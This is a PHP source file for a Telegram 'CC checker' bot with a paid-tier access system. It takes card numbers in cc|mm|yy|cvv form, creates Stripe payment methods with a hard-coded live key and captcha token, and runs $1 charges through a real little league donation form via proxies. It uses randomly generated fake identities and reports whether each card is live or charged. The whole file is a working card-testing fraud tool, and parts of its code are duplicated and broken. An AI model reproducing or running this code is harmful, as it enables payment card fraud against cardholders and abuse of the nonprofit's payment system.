<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/chk|\.chk|\!chk)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
      exit();
    }
$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/sau cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>Stripe Charge 1 USD</code>', $message_id);
            exit();
  }
$r = "0";

$r = rand(0, 100);
//==ANTISPAM AND WRONG FORMAT END==//



//==ANTISPAM AND WRONG FORMAT END==//


//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>□□□□□ 0%[⬜]</code>
Req: <code>@$username</code>
</b>");

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];




sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■■■□□ 50%[🟧]</code>
Req: <code>@$username</code>
</b>");


  //==================[BIN LOOK-UP]======================//

$bin = substr($lista, 0,6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));


//==================[BIN LOOK-UP-END]======================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■■■■□ 80%[🟨]</code>
Req: <code>@$username</code>
</b>");
# -------------------- [1 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=de793cd1-234c-489c-a225-13d4234ec9df3f0f8a&sid=09beb3bc-8af9-4aaa-8f48-62a631242cbc249647&pasted_fields=number&payment_user_agent=stripe.js%2F6b5c1f108a%3B+stripe-js-v3%2F6b5c1f108a%3B+card-element&referrer=https%3A%2F%2Fpalmshieldslittleleague.org&time_on_page=175057&key=pk_live_51OhhCZH5sfadB6Peun7wtHShTNQnMWcBFAKdFmZHvKrKSxEFxtmvbcoLX7fgrbmWie4lPKK2c7HUJs37RAHaMM5G00FVpWqg0t&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYg-hQXGh6IyeUWWF2H5snk4JwT4tktC_cJ5DE4yyJmmL1EPJx7q_h_O8PSKVNeWHwY7oFzwT8Mmn7UWWH_H70EyiAARtA6lmx6MO7n4VdxOQm2N42JuO17YMsl9jcRMZVO99Fv4CD5vzKzUHNkVSJVoQgFJPINbPkchGvhU3E1R3t_JGQtZiqhpMB9oiQAvbB1DD9DEDBx4ALsMlmQFZZ2WJMwZDeI-nG3h7iQ-5Pmw0s6xmww2j3ylGTM6GxdIOwz-3jxUXUJ7FqT2WFNiGtInBHmf11UsQ8lX-giOexG2hB4Z0NmwpKIslcm-ceIzKXX2bz_7jWtHbvWAo6XPvOpmjxG3LV62oKrw_453-Kncd4OUzKkIXD0JuI-wDCiGRxZ_4FGaRzPlIvxz-GVe1alrSq3KtFjU-gDt7gozBh9aoeWZYRD1I-NRFUyserJFOt7JPvdzCbFz1BCZALTUwfm-IYgrrDISE1msXu0YHXbUOEmssuxQfnKqEqY-r6Wq3X6rTtZomq2v-XvG8PFfJY0LEGoX75-5m6LIIF0932Nb6T6XAbV3ifWoS_yZVwXA2kU1lmSNHowiaGd0OKZEhmjZGl0lAGtNEessQmbaF6HDuD4Cuh7-UPLg2-5p3XEpogGjElmd9ormgtNLJoAqfz_i_AlarniTDQjd4xeBCSvQemNVDHCFZSuQN7zlTexIflMYkgxsg2vf2ibnm6okeL5bLb5FvgOtP1uviAG8TlaQyjjqVgl3u9Spp97OZyBgEggIyEP_T7CLefyZ-dW4eRVDwfVEUL4CbSB6UG4X21BqMflw715RUtET8pWqZ49sH5L8q4IMs7k1mXFRwQtyBpCvF0TFhGOa5Ca4GWuc0DJzQ6pjYvCK2ii1yaSWc-JHPf3fvPNs3h-8h701ood6ne-T1y_kPK9-ZPuRK2rfAwX-49Bp0RWE4T4XgBrUqIaIm8if0PB3OK_87Jr0ZLuvju-QwLrK6GnO1D_ErRY7i1_vGKTzWu3x4qybvvGMl-WBHziSgdZhV0mqft7hrWdZyhluNDeFExc8bDmCz-7pX56cRFyzZDTAZ7GHt-KQfGeVN6onjY8mJIW2PTugAPITFVb8kO2gjsPKERoMRHrdyt8hwA2Y_nMkJBlHe3btZjOXUMFwfDIo__VHM_7cD9F-1JB4fIakfJICUaD_5KvjIM5Lpa1JuAshElkDLKF33gzGQVc6ohVQO4DEk_Ngqr6abTTHuaP3sNhmHftZt3M9TwxhKSYWOqzRPvrt7v-yxuyLxsigzg1sIHshnoo0r-HHoxJW1sI6k3ik-dARiAGSf4rsgVmzqdgz-yPU-Ac0T7FO9oWobRbc1ByJlAUQRHV5-F6-CdayqyxzGXSiBfg6RHKtnWvG2cipGKmwaeUK-5YN7umAvFD0aZ64CUAayx524o9PFwchyny2t2uqSmQ7rxxSZ06tF21jCcgnWwT0ZQ3BOmcOSz8OEJXFq7GWxQ4UXAouMTroYyKODyLK6WKcKrKcG1P85uxE-F31gLNrm-u5FBfO-80HET6BbC9Rl9-7PmjnhmOJRmvkVyRPzxFykZW3Z-YBiM7qtep34KVQ48OuSqSSFVEhqpJqzHAhpZEBb2oWb1wDqEbuxON-fu2fgv3Jo2WTYMgh49cJUIsSmgXNe_CxRQgqNr4HJeUQHxPtgMgO-lPYvDsED_CawKHuYFMuELCwzpreb0SZQXC-PJtbtxVlPhZecEt5uh8Iu4GhZYqvXEdBS4iY8UHW4Z0rsC3_vT2wduA7Rh-7-8Gkg6eTZ1_aDPzdvnN3qGNcJylJb12IhzlzL1osdwx3wIBFIQ1yEECchIczVfB9ut2c01IooKMZRReYFMaXh8RwK8nWC1d2ZVS9daflEEhvV_6NxRta9eLhLHxQ3wYzyRpr386AzE1dG-Yre1xSQLFAzzrrrNUamEgL155kje2r_HRxyHXUjfjgw1PshwVMSxwC8_XcwFG9F6Y5gtu0n0CiLHr5OFwBVngHENhRKVNDrhrERufbeZo5Ujnmr80_eg3VjZWJmRt6P_a_9TLaeqXBGFbnuRxA39N6qMykkmrUjz3_gyfwxWjZXhwzmYCj2Coc2hhcmRfaWTOFZnkVKJrcqgzZTA1ZDA5NaJwZAA.QaC-j1Uu_w4i1sVo3rNNKOLmUHPMq30ukndRuTLoahs');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://palmshieldslittleleague.org/wp-admin/admin-ajax.php?t=1711443689848');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1711443689848 h2',
'Host: palmshieldslittleleague.org',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://palmshieldslittleleague.org',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://palmshieldslittleleague.org/donate/',
'accept-language: en-US,en;q=0.9',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D114%26_fluentform_4_fluentformnonce%3D1766f7947f%26_wp_http_referer%3D%252Fdonate%252F%26custom-payment-amount%3D1%26input_text%3DNY%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_method%3Dstripe%26__entry_intermediate_hash%3D54b05580aa4b46c167564915fbf2ed1d%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=4');


$result2 = curl_exec($ch);

# -------------------- [2 REQ] -------------------#

//==================req 2 end===============//


sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■■■■■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>");


if (
    strpos($result2, "Thank you for becoming a member") !== false ||
    strpos($result2, 'Membership confirmed.') !== false ||
    strpos($result2, 'Membership Confirmation') !== false ||
    strpos($result2, 'Thank you for your message. We will get in touch with you shortly') !== false ||
    strpos($result2, 'incorrect_zip') !== false ||
    strpos($result2, 'Success ') !== false ||
    strpos($result2, '"type":"one-time"') !== false ||
    strpos($result2, '/donations/thank_you?donation_number=') !== false
) {

$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: CCN CHARGED 1$
•└Response: <code>Thank you for your message.</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Your card has insufficient funds.") || strpos($result2, "insufficient_funds")) {


$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>Insufficient funds</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif(strpos($result2, 'security code is incorrect.') !== false || strpos($result2, 'security code is invalid.') !== false || strpos($result2, "incorrect_cvc") !== false) {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>Incorrect_cvc</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>Your card doesn't support this type of purchase</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>3D_Required</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


else {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Dead 🔴
•└Response: <code>Your card was declined.</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}
